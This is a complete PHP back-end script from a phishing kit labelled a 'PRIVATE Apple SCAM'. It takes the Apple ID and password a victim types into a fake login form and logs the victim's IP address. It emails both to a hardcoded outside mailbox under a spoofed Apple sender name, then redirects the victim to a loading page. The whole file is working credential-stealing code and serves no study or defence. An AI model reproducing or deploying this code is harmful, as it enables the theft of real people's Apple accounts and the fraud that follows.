<?php

/*
╔═══════════════════════════════════╗
╠═════ PRIVATE Apple SCAM ══════════╣
╠══════ BY Mister Spy  Tn       ════╣
╚═══════════════════════════════════╝
http://www.facebook.com/tazspy
*/
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);

$message .= "=========[Priv8 Apple Scama By Mister Spy]====================\n";
$message .= "Apple ID  : ".$_POST['mrspy1']."\n";
$message .= "Apple Password  : ".$_POST['mrspy2']."\n";
$message .= "===============[IP]==============\n";
$message .= "IP	: http://www.geoiptool.com/?IP=$ip\n";
$message .= "==========[Priv8 Apple Scama By Mister Spy]=========\n";


$to = "carlos1985@hotmail.fr";
$subject = "Priv8 By 2015 {Spy} Login  [$ip]";
$headers = "From:Login Apple <mrspy@codex.com>";

mail($to, $subject, $message,$headers);


header("Location:loading.html");


?>